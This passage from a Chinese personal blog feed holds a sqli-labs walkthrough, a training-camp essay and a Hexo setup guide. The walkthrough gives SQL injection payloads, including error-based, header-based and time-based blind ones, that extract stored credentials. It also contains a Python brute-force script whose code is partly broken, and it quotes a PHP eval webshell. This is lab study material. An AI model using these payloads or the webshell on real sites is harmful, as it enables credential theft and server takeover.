href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/0[%7DF[P%7BHGS9$L%60ZUP9G8S8B.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/0%5B%7DF%5BP%7BHGS9$L%60ZUP9G8S8B.png" alt="img"></a></p><p>而在登录框中构造的语句仍然是有效的，因为我们输入的就是post所上传的数据。</p><p>当我在username栏末尾输入‘时报错。从这个报错语句中即可以看出这里的sql语句是以单引号闭合的。</p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210712214452.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210712214452.png" alt="img"></a></p><p>这里的username和password都是注入点，任选一个都可以使用语句注入。</p><ul><li>输入单双引号，观察报错信息，构造命令使语句闭合</li><li>使用 order by 语句判断字段数</li><li>构造语句查询数据库的信息</li></ul><p>所有步骤和1~4关的都一样，只是注入方式由get变为post,我们输入的工具语句也由在url中输入变为在表单中输入。另外注入符用#而不是%23，因为我们输入的语句不再经过浏览器url解析了。</p><p>12就是语句双引号加单小括号闭合，注入方法不变。</p><hr><h3 id="13-14"><a href="#13-14" class="headerlink" title="13-14"></a>13-14</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">这两关名字叫做<span class="hljs-built_in">post</span>类型的双重注入，输入的正常查询语句不再显示有用的信息，但报错语句仍有提示。通过报错信息闭合语句并查询完字段数后，根据前<span class="hljs-number">5</span>~<span class="hljs-number">6</span>关<span class="hljs-built_in">get</span>类型的双重注入经验可先按照以往<span class="hljs-built_in">get</span>类型的双重注入来尝试，果然成功了。<br></code></pre></div></td></tr></table></figure><p>语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">1&#x27;) union <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a #<br></code></pre></div></td></tr></table></figure><p>对应结果</p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/jhgfhj.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/jhgfhj.png" alt="img"></a></p><p>而第14关就是语句的闭合方式变为双引号，可按照同样的方式进行注入。</p><hr><h3 id="15-16"><a href="#15-16" class="headerlink" title="15~16"></a>15~16</h3><p> 这两关是post类型的盲注。有了之前get类型中盲注的经验，这两关也就不那么复杂了。</p><p>此时的页面是不会提供一丁点信息的，语句正确与否只会弹出一张图片来告诉我们是否登录成功，而这个信息对我们来说是没用的，所以想到利用盲注的方法来进行注入。在尝试bool型盲注无效后目前唯一可利用的就是利用time类型的盲注。</p><p> <em>我找了网上的许多教程，都是直接 用语句<code>admin&#39; and if(1,sleep(3),1) #</code>就确定了存在时间类型的盲注，但我没想明白为什么直接就用了一个正确的账号名称admin和and 语句链接。而我尝试了or语句语句好像是不起作用的</em></p><p> 完善了一下之前的脚本，顺利完成任务。贴一下脚本的主要代码：</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-meta">#playload:</span><br># <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata<br># <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;  &#x27;</span><br># <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;  &#x27;</span><span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;  &#x27;</span><br># <span class="hljs-keyword">select</span> group_concat(concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">password</span>,username)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users<br>dic = <span class="hljs-string">&#x27;&#x27;&#x27;abcdefghijklmnopqrstuvwxyz,_ 0123456789()~`!@#$%^&amp;*-=+[]&#123;&#125;;:&#x27;</span>&quot;|\,&lt;.&gt;/?&#x27;&#x27;&#x27;#基于这个字典循环爆破<br>string = &#x27;&#x27;<br>url = &quot;http://<span class="hljs-number">192.168</span><span class="hljs-number">.147</span><span class="hljs-number">.181</span>/sqli-labs-master/Less<span class="hljs-number">-15</span>/&quot;<br>for i in range(1, 100)  <br>for j in dic:<br>    payload = &#x27;&#x27;&#x27;admin&quot;)<span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(substr((<span class="hljs-keyword">select</span> group_concat(concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">password</span>,username)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users),&#123;&#125;,<span class="hljs-number">1</span>)=&#123;&#125;,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)#<span class="hljs-string">&#x27;&#x27;&#x27;.format(int(i), ascii(j))</span><br><span class="hljs-string">        # 针对不同题目修改payload与data</span><br><span class="hljs-string">         data = &#123;</span><br><span class="hljs-string">                &#x27;</span>unam<span class="hljs-string">e&#x27;: payload,</span><br><span class="hljs-string">                &#x27;</span>passwd<span class="hljs-string">&#x27;: &#x27;</span>&amp;submit=Submit<span class="hljs-string">&#x27;</span><br><span class="hljs-string">         &#125;</span><br><span class="hljs-string">          # print(data)</span><br><span class="hljs-string">         response = requests.post(url, data=data)</span><br><span class="hljs-string">         sec = response.elapsed.total_seconds()</span><br><span class="hljs-string"></span><br><span class="hljs-string">         if sec &gt; 2: </span><br><span class="hljs-string">         string += j</span><br><span class="hljs-string">            print(string)</span><br><span class="hljs-string">            break</span><br><span class="hljs-string">print(string)</span><br></code></pre></div></td></tr></table></figure><p>爆破的部分结果图：</p><p>有点奇怪为什么账号和密码用的是y来隔开，依照我用的语句应该是~隔开才对</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">payload = <span class="hljs-string">&#x27;&#x27;&#x27;admin&quot;)and if(substr((select group_concat(concat_ws(&#x27;~&#x27;,password,username)) from security.users),&#123;&#125;,1)=&#123;&#125;,sleep(3),1)#&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(i), <span class="hljs-built_in">ascii</span>(j))<br></code></pre></div></td></tr></table></figure><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210725152947.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210725152947.png" alt="img"></a></p><hr><h3 id="17"><a href="#17" class="headerlink" title="17"></a>17</h3><p><em>历时很久做到了这里，我越发觉得需要多看看php，这样看看源码应该会对闯关有很大的帮助，不然每道题都是百度谷歌必应轮流转…于是乎我看了段时间的php…然而好像并没有什么明显的帮助，网站能用到函数太多了0.0..遇到了再去了解吧…</em></p><p>这道题有提示说是password reset，通过尝试登录可以发现这关会检测你输入的用户名，当用户名错误的时候会友好提示并鼓励你😤</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210910211641.png"></p><p>而用户名正确时会弹出不一样的界面：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210910211808.png"></p><p>它会提示你密码已更新。（事实上是真的更新了，这也可能也是我无意间把这个网站的数据库中password搞没的条件..后面会提到）</p><p>阅读源码可知注入点就在password处。</p><p>（然而我看起来很吃力。。百度看别人的<a href="https://blog.csdn.net/qq_43399807/article/details/116276217"> sqlilabs第17关_wh1sper、的博客-CSDN博客_sqlilabs第17关</a>）</p><p>然后在password处构造一些基本的sql注入语句，都失败了。如图所示order by字段数都查不了。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210910213407.png"></p><p>于是在这里又需要掌握一种新的方法——报错注入</p><p>（其实第5、6关也能用报错注入，在有报错语句提示的时候也许就能用上的方法）</p><p>报错注入可分别使用以下两种函数 ：</p><ul><li>extractvalue（）</li><li> updatexml（）</li></ul><p>基本格式：</p><figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali">?id=1<span class="hljs-built_in"> and/or </span>updatexml(1,(payload),1)<br>?id=1<span class="hljs-built_in"> and/or </span>extractvalue(1,concat(0x7e,(payload),0x7e))<span class="hljs-comment">#</span><br>//仍然需要先尝试使用单双引号来先闭合语句再来构造sql注入语句<br></code></pre></div></td></tr></table></figure><p>在这里执行语句如下</p><p>(你会发现下面三种语句好像都不是固定的语法，我尝试找了下规则，还是觉得记住</p><p>**<code>extractvalue(1,concat(0x7e,(payload),0x7e))#</code>**这一种形式就好了)</p><figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp"><span class="hljs-comment">//查询当前数据库</span><br>passwd=<span class="hljs-number">1&#x27;</span><span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(database(</span>))))#</span><br><span class="hljs-function"><span class="hljs-comment">//查询所有的数据库名</span></span><br><span class="hljs-function">passwd</span>=<span class="hljs-number">1&#x27;</span><span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata),1)#</span><br><span class="hljs-function"><span class="hljs-comment">//查user下的表名</span></span><br><span class="hljs-function">passwd</span>=<span class="hljs-number">1&#x27;</span><span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>))<span class="hljs-meta">#</span><br></code></pre></div></td></tr></table></figure><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/image-20210910222943565.png"></p><p> <img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210910222833.png"></p><p>值得注意的是，这关不让直接查user表，当sql语句为    <code> and extractvalue(1,concat(0x7e,(select group_concat(username) from security.users),0x7e))#</code>会弹出如下结果：<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911105416.png"></p><p>所以需要换个名字绕过</p><p><code>and extractvalue(1,concat(0x7e,(select username from (select username from users)a limit 0,1),0x7e))</code></p><p>另外我发现我数据库中好像所有的password都没了，像是这样。。。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911154244.png"></p><hr><h3 id="18-20"><a href="#18-20" class="headerlink" title="18~20"></a>18~20</h3><p>通过提示并查看源码可知第18关的注入点不在username和password上了，而在数据包的User-Agent处。</p><p>通过尝试构造sql注入语句发现有报错信息，所以继续采取报错注入</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911152728.png"></p><p><code>User-Agent: 1&#39;and extractvalue(1,concat(0x7e,(database()),0x7e)) and &#39;1&#39;=&#39;1</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911152654.png"></p><p>成功查询到当前数据库名。</p><p>另外这里的语句末尾并不是用注释符#闭合，而是’1‘=’1来闭合。</p><p>剩下的步骤就是利用报错注入，不再重复。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911153419.png"></p><p>而第19关就从ua变成了Referer</p><p><code>Referer: &#39;and extractvalue(1,concat(0x7e,(database()),0x7e))  and&#39;1&#39;=&#39;1</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911154938.png"></p><p>不再赘述。</p><p>20关是在cooki处</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210911155830.png"></p><hr><h3 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h3><hr><ul><li><p>1~4 GET - Error base 类型，很直白的把信息都显示出来，没啥好说的。</p></li><li><p>5~6 GET -double 类型，输入的正常查询语句不再显示有用的信息，但报错语句仍有提示。用到了mysql数据库rand,group_by,count函数结合使用的特性（bug？），原理有点复杂，和前面基础类型相比，就结果而言其实就是order by后面的步骤中，</p><p><code>union select 1,2...</code> 变成了</p><p><code>union select count(*),concat( (select ..), floor(rand(14)*2))as c from 任一一个表名 group by c</code></p><p>另外，group_concat拼接在语句中会失效（不知道为啥），使用limit语句作为代替来查询 more than 1 row 的数据。</p></li><li><p>7 GET -Dump into out file 类型，初识文件上传漏洞。使用into outfile函数，指定服务器上的绝对路径可实现上传文件，可用来上传一句话木马<code> &lt;?php @eval($_POST[&quot;密码&quot;]);?&gt;</code>，配合中国菜刀（攻击工具）达成目的。</p><p><em>小插曲：我就在这里写了个一句话木马（虽然在这里并不起作用），win10 的defender还是检测到了并弹出了危险警告。真是苦了defender能在我写的一堆垃圾中还找到疑似会伤害我的东西🤣</em></p></li></ul><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/1DAFD32562C47EE4EB5BDD578D1CA7F0.jpg"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/1DAFD32562C47EE4EB5BDD578D1CA7F0.jpg" alt="img"></a></p><p>不过这防火墙是真烦人，打开文件就报毒，搞得我都误删了一次。心痛得我连夜把博客加进defender白名单。</p><ul><li><p>8 GET - Blind - Boolian Based 类型 掌握一些截取字符的函数，并要学会写py脚本解决。</p></li><li><p>9~10 GET - Blind - Time Based 类型 掌握sleep函数，并要学会写脚本解决。</p><p>盲注是最常见的sql注入类型，所以有必要仔细掌握。从这开始也就要学会写脚本工具了。</p><p>盲注采取的攻击语句并没什么变化，只是多了截取字符与字典比较的过程，这种爆破的思路很适合用脚本解决。</p></li><li><p>11~12 POST-Error Based 类型 接触到post类型的注入，最大的变化是不通过url地址栏，而是通过上传数据的表单进行注入攻击了，语句也不再通过浏览器url解析，如注释符“#”直接用而不再是用“%23”。</p></li><li><p>13~14 POST-double 类型。方法同get。</p></li><li><p>15~16 POST-Blind 类型。（虽说关卡名字说是布尔注入，但我没找到语句正确与错误时返回页面的不同，可能需要抓包来看了）。同样用python脚本解决，对python的掌握程度要求并不高。</p></li><li><p>17 POST-Update类型。利用已有账户，对其修改密码处注入，注入方式为报错注入。用到了extractvalue()或updatexml()函数</p></li><li><p>18~20 POST header/cookie 类型。就是注入的位置不在明显的页面中，而在数据包内。后面这几关都是采取的报错注入的方式。</p></li></ul><hr><p>断断续续弄了这么久，终于做完了前20关…有缘再写后面的了</p><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不为五斗米取照片</title>
    <link href="/2021/05/16/did-I-need-photo/"/>
    <url>/2021/05/16/did-I-need-photo/</url>
    
    <content type="html"><![CDATA[<hr><p>本来该九月份军训的，因为新冠肺炎推迟到了次年五月。</p><p>今天是军训的第七天。</p><p>上午，教官再次提了集体照的事。</p><span id="more"></span><hr><p>首先有个问题，教官是个什么职业？</p><p>教官们可能都普遍有个军人身份。褪去之后，也是老百姓，要上班的。</p><p>教官，兼职罢了，和家教那种挺像的。当然这只是个人看法。（我贱民可不敢把话说太狂……）</p><p>人总想着赚钱，就开创了副业。</p><p>教官们也有副业，开照相馆的。</p><p>同室友聊天才知道，我们的教官头子，教官们叫他参谋长，是开照相馆的，微信号就是他照相公司营业的号。</p><hr><p>军训的第三四天左右，教官就开始说照集体照的事。</p><p>大意是：</p><p>过两天所有人都要拍集体照，照片15块一张，自愿购买,去外面照相还不止这个价，就只有这两天时间交钱。</p><p>毕竟这可能是我们人生中最后一次军训了，值得回忆巴拉巴拉……</p><p>话说的好听且在理，但我不是很想要照片，纯属个人原因。</p><p>15块不贵也值一顿午饭，应该比一张我几乎不会用到的纸划算。</p><p>当然，目前为止合情合理，额外提供实际服务，绝对自愿。</p><p>而一想到参谋长微信的传闻我就感觉事情没这么简单。</p><p>后面几天，训练的时候教官在操场催交钱，同时微信群收款行云流水。我有理由认为建立微信群相当大的一个理由就是方便收钱。</p><p>说是自愿，100人左右的连队只有大概30%的人交钱时，我们教官满脸不高兴，说是这两天截至，过了时间又一再延期。</p><p>催了数次，问了数次哪些人没交。</p><p>我们教官问一位训练得很好的同学，“你有没有交照片钱？” “交了”。</p><p>于是我们教官指着他对其他没交钱的同学说，“你看看！”，还挺骄傲的。</p><p>这是叫我们向榜样学习呢。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/WQNMD_txbb.png"></p><p>我默不作声，随你便吧。</p><p>而真正让我觉得离谱的，是照相过后发生的事。</p><hr><p>连队一个接一个照相，我们照完后在操场上休息。</p><p>过了一会儿几个别的连队的教官过来叫我们集合，同别的连坐在一起。</p><p>教官们又在催交钱。这破事还要集体做次思想工作。</p><p>要是开学日期能像交钱这回事的截至日期一样一再延迟就好了。</p><p>教官们这次来催钱的方式很奇特。</p><p>他们派了一个演说家，也是一位教官头头，平时拿着话筒发号施令，也常来视察方队的训练情况。</p><p>第一次我们见到他的时按照礼节问候说，教官好，他说不得行，该叫大哥好，因为他是我们团的老大。我觉得这样套近乎挺有趣的。</p><p>我们说“大哥好！”</p><p>他说道，”喔对头！这个团我管事！晚上夜训，想不想我罩着你们？带你们尽情的耍，我说了算！“</p><p>此时我们几个连队都在笑，有大哥好啊。</p><p>”前提是你们要把自己的事做好哈！只要你们做好了，想咋个耍咋个耍！“另外的教官说到”懂得都懂。“</p><hr><p>同学们懂了，他们戏称15块充个剩下7天军训vip。</p><p><strong>我也懂了。要我叫你大哥还要给你钱。斯德哥尔摩综合症是吧。</strong></p><p>没本事还想站着把钱挣了。</p><p>军训照片，我的回忆，他们的人民币。药药切克闹。</p><p>我不为五斗米取照片。</p><p>怎么训练我无所谓的，我不仅铁了心不要照片，顺手还退了微信的群。我管你是不是有什么照片率的指标要完成。</p><p>”大哥“说了一圈过后，要照片的人多了不少。</p><p>接着，我们教官要求发收款码的同学念一下交了钱的人的名字。</p><p>在他念名字的途中，我猜又多了不少”想“要照片的。</p><p>还红脸白脸轮番来，就差一句坦白从宽抗拒从严了。</p><p><strong>我们教官念完名字说到”没交钱的站起来。“</strong></p><p>不站起来他也发现不了。</p><p>可他凭什么让我站起来。不断施压，话越说越重，獠牙渐露。我得站出来。</p><p>我想到的可不是什么人在屋檐下，不得不低头。</p><p>而是宁折不屈。我有点怕万一他们吃相更难看了怎么办，我该怎么做呢。</p><hr><p>同我的一同站起来的还有前面几个同学。教官挨个单独问话，他们有的说什么没加群马上加群啊，刚刚才给啊…….起来几个人又补交了不少。</p><p>我本想说，就是不想要照片，但被教官单独问到”你为什么不交钱“时却只蹦出来一个字，”穷。“</p><p>”那你坐下吧。“</p><p>结束了。</p><p>我原以为会有一场据理力争荡气回肠的battle呢。靠。</p><p>之前那几位没交钱的同学，究竟是怎么想的呢……</p><hr><p>现在回想起来，我该直接就说不想要的。</p><p>有多少同学是迫于压力才要照片的呢，教官们究竟会不会或者已经越界了呢，不得而知了。</p><hr><p>另：</p><p>当天晚训的时候还是按照常规训练。</p><p>我们连队里有以下两个极具代表性的声音：</p><p>1.”我大哥喃？？来带我耍啊？“</p><p>2.“RNM！退钱！！！”</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/RNM_tq.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
    <tags>
      
      <tag>纪实</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建自己的博客</title>
    <link href="/2021/05/15/blog_build/"/>
    <url>/2021/05/15/blog_build/</url>
    
    <content type="html"><![CDATA[<hr><p><em>记录一下自己第一次搭建静态博客的经历</em></p><p><strong>本文不会记录详细的操作过程,只是整理流程与记录心得 ^_^</strong></p><hr><span id="more"></span> <h3 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h3><hr><ul><li><p>所用主机</p><ul><li>win10</li></ul></li><li><p>所用软件</p><ul><li><p>git </p><ul><li><p>git是什么？</p><p>​        版本控制工具，方便在不同版本进行切换修改，类似文件分不同时间备份让后需要时找回其中一份代替，同时git所带的<code>git bash</code>方便用户在windows下使用git命令的模拟终端（windows自带的cmd功能太弱）linux、unix可以直接使用git。</p><p><strong>在搭建博客的过程中也主要使用的这个模拟终端的功能，甚至用于版本控制的git命令都用不上。有点像买部手机就用来当照明灯使（当然这里的git很具有适用性）。</strong></p></li></ul></li><li><p>node.js(JavaScript 运行环境,)</p><p>随node.js一同安装的包管理工具npm,使用npm安装的模块hexo</p><ul><li><p>什么是包管理工具？ </p><p>​      也叫包管理器,它允许用户在操作系统上安装、删除、升级、配置和管理软件包。软件包管理器可以是像“软件中心”这样的图形化应用，也可以是像 <a href="https://itsfoss.com/apt-vs-apt-get-difference/">    apt-get</a> 或 <a href="https://itsfoss.com/pacman-command/">pacman</a> 这样的命令行工具,python中的pip即为一种包管理工具。</p></li></ul></li></ul></li></ul><ul><li><p>所借助的平台</p><ul><li><p>github</p><ul><li><p>github是什么？</p><p><del>同性交友网站</del></p><p>利用git进行代码管理的托管平台</p></li><li><p>为什么选择github?</p><p>github有一个很有爱的项目,叫做<code>github pages</code>,这个项目是给开发者建立一个私人页面,所以许多人都拿来搭博客用了,在创建仓库的时候将仓库名名为:用户名.github.io时开启</p><p>即用github pages项目代替了服务器,缺点就是功能不完全,只能控制小部分范围,但这对搭建个人静态博客够用了,用码云gitee同理。</p></li></ul></li></ul><p>​    </p></li></ul><hr><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><hr><p><em>简单来说就是在本地计算机搭建Hexo环境，Hexo通过generate命令将*.md文件渲染成静态的html页面，然后Hexo通过deploy命令触发git用户通过公钥免密登陆服务器(这里的github即作为托管服务器)，进而将静态页面推送到服务器的git仓库（repository）中。然后，服务器再通过钩子（git-hooks） 将静态页面checkout到网站的根目录下，进而实现博客的自动部署。</em></p><p><strong>就是敲几个命令，让git和hexo帮你把几件事办完了。</strong></p><hr><h3 id="实际流程"><a href="#实际流程" class="headerlink" title="实际流程"></a>实际流程</h3><hr><ul><li><p>下载git,配置用户信息</p><p>这里需要配置用户名和邮箱。而这些信息并不是起权限验证的作用,这么做的一个目的是为了记录操作过程，就是方便给人看的，如记录某某上传了什么或者干了别的什么。可以随便输入用户名和邮箱但不推荐。</p></li><li><p>将git与github链接在一起</p><ul><li><p>将git与github进行ssh key链接</p><ul><li><p>什么是ssh？</p><blockquote><p><em>SSH 为 Secure Shell （安全外壳协议）的缩写，SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。即可用ssh协议远程登陆主机，这里的远程主机即为github仓库。</em>—摘自《百度百科》</p></blockquote></li><li><p>为什么GitHub需要SSH Key呢？</p><blockquote><p>因为GitHub需要识别出你推送的提交确实是你推送的，而不是别人冒充的，而Git支持SSH协议，所以，GitHub只要知道了你的公钥，就可以确认只有你自己才能推送。当然，GitHub允许你添加多个Key。假定你有若干电脑，你一会儿在公司提           交，一会儿在家里提交，只要把每台电脑的Key都添加到GitHub，就可以在每台电脑上往GitHub推送了。—摘自廖雪峰老师网站</p></blockquote><p>​                                                                                 </p></li></ul></li></ul></li></ul><p>使用git创建ssh密钥，然后将这个密钥添加到github用户的账号中，这样用户即可实现用git免密登录管理github了</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>值得一提的是生成密钥的命令，常常如下：<br><br>ssh-keygen -t rsa -C <span class="hljs-string">&quot;你的邮箱&quot;</span><br><br><br>-t 用来指定加密算法为 rsa；<br>-C 后面是个注释信息，并不一定要和你 Git 账户的邮箱或者 Git 账户名保持一致，只是常常是和你账户邮箱保持一致，这样设置，就能知道这个公钥被绑定在哪个 Git 账户上了<br></code></pre></div></td></tr></table></figure><ul><li><p>使用hexo搭建博客</p><p>通过在git bash 中使用一些hexo命令。即可实现博客的搭建与上传。</p><p>hexo的工作流程：</p><ul><li><p>hexo  init  文件名 ：</p><p>​        创建一个初始化的文件，里面有搭建hexo博客所需的基本文件，后续操作以及关于博客的修改都在这个文件中进行。</p></li><li><p>hexo g：</p><p>​        生成静态文件。将我们的数据和界面相结合生成静态文件的过程。会遍历主题文件中的 <code>source</code> 文件夹（js、css、img 等静态资源），然后建立索引，然后根据索引生成 <code>pubilc</code> 文件夹，此时的 <code>public</code> 文件是由 html、 js、css、img 建立的纯静态文件可以通过 <code>index.html</code> 作为入口访问你的博客。</p></li><li><p>hexo s:</p><p>生成本地预览文件，通过浏览器搜索localhost:4000即可查看生成的静态博客 </p></li><li><p>hexo d：</p><p>部署文件，即将静态博客上传到服务器上。部署主要是根据在 <code>_config.yml</code> 中配置的git仓库，将博客中<code>public</code>文件上传至 github  中。然后再根据上面的 github 提供的 pages 服务呈现出页面。</p><ul><li><p>如果出现本地预览与部署到服务器上不同的情况，按F12发现css效果缺失，这是由于博客的config配置文件中指名一些css的地址只在localhost下是正确的，而指向服务器的仓库时是错误的，解决办法如下</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>在配置文件url那一部分中加入<br><br> root：/<br></code></pre></div></td></tr></table></figure><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/blog_build_illustration.png"></p><p>意思就是叫浏览器从根目录下慢慢找… 很省事的办法（指省我的事不是省电脑的）</p></li></ul></li></ul><p>​        后续将md类型的文件加入到该文件\source\_posts中即可对博客内容进行修改（不推荐这么做，后文有写原因）。具体样式还需要查看博客主题的的设置，默认的博客主题为landscape。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">整个流程中关于_config.yml配置的配置很关键<br>空格不能少，很坑喔<br><span class="hljs-symbol">deploy:</span> <br><span class="hljs-symbol">    type:</span> git<br><span class="hljs-symbol">    repo:</span> https:<span class="hljs-comment">//github.com/2693993651/2693993651.github.io.git</span><br><span class="hljs-symbol">    branch:</span> main<br>这个配置好之后，即可使用hexo d 命令了<br>另外，因为githu在国内很难访问，hexo的许多命令都可能因不能链接到服务器而失败，需要重试几次。而且，为了有逼格的域名与访问速度还需要去租域名，服务器（或部署gitee）<br></code></pre></div></td></tr></table></figure></li></ul><hr><h3 id="博客的优化"><a href="#博客的优化" class="headerlink" title="博客的优化"></a>博客的优化</h3><hr><ul><li><p>关于文章</p><figure class="highlight haxe"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haxe"><span class="hljs-comment">//建议写文章前先执行以下命令</span><br>hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> categories<br>hexo <span class="hljs-keyword">new</span> 